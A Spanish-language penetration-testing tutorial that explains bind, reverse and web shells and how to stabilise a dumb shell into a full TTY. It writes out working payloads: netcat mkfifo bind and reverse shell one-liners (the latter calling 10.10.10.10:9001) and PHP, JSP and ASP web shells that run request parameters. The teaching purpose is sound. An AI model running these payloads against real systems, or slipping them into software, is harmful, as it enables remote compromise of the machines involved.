[<- Índice](../Pentesting.md)
# Tipos de Shell

Una vez que tenemos un vector claro de ataque sobre el objetivo, nuestro objetivo más deseable es el de conseguir una línea de comandos sobre el sistema para una comunicación más práctica.

> Una forma de conseguir esta línea de comandos es mediante *shells*. Particularmente, hay 3 tipos de *shells* que podríamos establecer en un sistema comprometido.

| Tipo de *Shell* | Descripción                                                                                                                                                                                       |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| *Bind Shell*    | El sistema comprometido habilita uno de sus puertos a la espera de que nos conectemos para brindarnos una línea de comandos. Nosotros somos los que estableecemos una conexión hacia el objetivo. |
| *Reverse Shell* | El sistema comprometido se conecta hacia nuestro equipo y brinda una línea de comandos. Se considera que la conexión es reversa pues es el objetivo el que se conecta a nosotros.                 |
| *Web Shell*     | Logramos establecer una forma de ejecutar comandos a través de un sitio web, es decir, logramos ejecutar comandos enviados a través de *HTTP* y obtener de vuelta la salida de estos comandos.    |

### Bind Shell

> Como dijimos anteriormente, el objetivo es habilitar un puerto del sistema comprometido y colocar una línea de comandos a la escucha, de modo que podamos conectarnos a dicho puerto y ejecutar comandos a través de este.

De ser factible, es una forma de conexión cómoda, pues si por cualquier motivo se pierde la conexión, podemos reconectarnos inmediatamente al puerto a la escucha.

Sin embargo, no siempre es posible establecer un puerto a la escucha ya sea por controles de red o por restricciones sobre la creación de procesos.

Un ejemplo de **carga útil** para obtener una *Bind Shell* es:

```bash
# Payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

El comando anterior, coloca en escucha a `/bin/bash` en el puerto 1234, de modo que a través de este puerto podemos ejecutar comandos de manera remota.

### Reverse Shell

> Una *Reverse Shell* es una de las *shells* más populares pues es una forma rápida, fácil y llamativa de obtener control sobre el sistema comprometido.

En esta ocasión, nosotros somos los que debemos colocar un puerto a la escucha en nuestro equipo, para posteriormente entregar una **carga útil** en el objetivo que inicie una conexión hacia nuestro puerto.

Para poner un puerto a la escucha, debemos iniciar un *listener* en nuestro equipo mediante un comando como `nc` o `ncat`.

```bash
# Listener en el úerto 9001
nc -lnvp 9001
```

Una vez este listo el *listener*, entregamos la **carga útil** que detona la conexión reversa hacia nuestro equipo en el puerto indicado.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

El comando anterior, genera una conexión de vuelta hacia nuestro equipo, proporcionandonos una línea de comandos en nuestro *listener*.

### Web Shell

> Una web shell, es típicamente un *script* o código en el lenguaje de programación del *backend* del servidor web. Este código recibe un comando a través de un parametro de una petición *GET* de *HTTP* y lo ejecuta para despues imprimir su salida en la página web.

Existen muchos códigos de *Web Shells*, mucho más complejos e incluso llamativos visualmente, pero algunos ejemplos simples de *Web Shell* son:

**Para backend `php`**

```php
<?php system($_REQUEST["cmd"]); ?>
```

**Para backend `jsp`**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**Para backend `asp`**

```asp
<% eval request("cmd") %>
```

La clave de estos archivos es lograr ==cargarlos en algún directorio del servidor web== para poder ejecutarlos desde nuestro navegador.

Una vez logrado, simplemente tenemos que acceder a nuestro archivo desde nuestro navegador e indicar los comandos a ejecutar mediante el parametro específicado.

Por ejemplo, si logramos subir nuestra *Web Shell* de `php` como un archivo `shell.php` que recibe el parametro `cmd`, tendriamos que visitar la *URL*:

```url
http://inlanefreight.com/shell.php?cmd=id
```

Y obtendriamos una página:

```shell-session
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

De este modo, podemos ejecutar los comandos que deseemos sobre el equipo y visualizar su salida en `shell.php`.

Aunque muy útil, los otros tipos de *Shell* son más deseables y cómodos, por lo que usualmente utilizaremos esta *Shell* para escalar a una de las 2 anteriores.

## Estabilización a una Shell TTY

Ya sea al obtener una *Bind* o *Reverse Shell*, tendremos lo que se denomina una *Dumb Shell*, pues este tipo de terminales, aunque funcionales, carecen de varias características de una terminal *TTY* convencional, algunas poco graves como la falta de autocompletado, historial y del uso de flechas como cursor, pero otras más graves, como que no pueden utilizar `sudo` o `su` o que carecen de control de procesos `jobs`.

Entonces, es recomendable mejorar esta terminal mediante un proceso denominado ***Estabilización de Shell***.

> Básicamente, consiste en invocar una pseudoterminal *TTY* (una imitación vaya), y alterar ciertas propiedades específicas de nuestra propia terminal (donde ejecutamos el *listener*) y de la *Dumb Shell* obtenida.

No es un procedimiento precisamente intuitivo, simplemente se memoriza y se reproduce cuando se necesita, y es el siguiente:

***Invocación de psuedoterminal***

```bash
#
# DumbShell
#
python -c 'import pty ; pty.spawn("/bin/bash")'
```

o alternativamente:

```bash
#
# DumbShell
#
script /dev/null -qc /bin/bash
```

***Estabilización***

Primero debemos suspender y mandar a segundo plano nuestra *DumbShell* con el atajo *Ctrl+Z*, una vez realizado, regresaremos a nuestra terminal y ejecutaremos los siguientes comandos

```bash
#
# Terminal
#
stty -a
```

Esto nos indicará cuantas columnas y filas posee nuestra terminal, asi que debemos recordar dichos valores. Para este ejemplo supondremos que es 48 filas (rows) y 175 columnas (cols).

Continuamos con el comando

```bash
#
# Terminal
#
stty raw -echo ; fg
```

Este comando, altera nuestra terminal y trae devuelta la *DumbShell* del segundo plano.

Esto ya estabilizo de una manera un poco bruta la terminal, pero debemos darle unos toques finales con los comandos:

```bash
#
# DumbShell
#
export TERM=screen
stty rows 48 cols 175 # Los valores anotados
reset
```

Finalmente, tendremos una terminal *TTY* completa, con todas las características que carecía anteriormente.

# Enlaces